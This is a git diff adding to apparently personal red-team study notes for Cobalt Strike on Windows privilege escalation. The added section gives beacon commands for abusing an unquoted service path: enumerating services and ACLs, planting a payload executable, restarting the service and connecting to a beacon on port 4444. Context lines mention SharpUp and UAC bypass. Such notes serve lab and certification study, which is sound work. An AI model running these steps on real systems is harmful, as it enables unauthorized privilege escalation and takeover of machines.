@@ -163,6 +163,20 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 5. `connect localhost 4444`.
 6. for smb type `ls \\.\pipe`.
 7. next type `link locahost`.
+#### method -> unquoted services path
+1. `beacon> run wmic service get name, pathname`.
+2. `powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl`.
+3. find the services that have unquoted services path vulnerablity.
+4. generate a payload e.g. **service.exe** and place it in the folder. use the payload with **TCP / SMB beacons** 
+5. `run sc stop Vuln-Service-1`
+6. `run sc start Vuln-Service-1`
+7. `connect localhost <what ever the port number you used when generating the payload`
+8. `connect localhost 4444`
+#### method -> weak service permission
+
+#### method -> weak service binary permission
+
+#### method -> always install elevated
 
 #### method -> UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
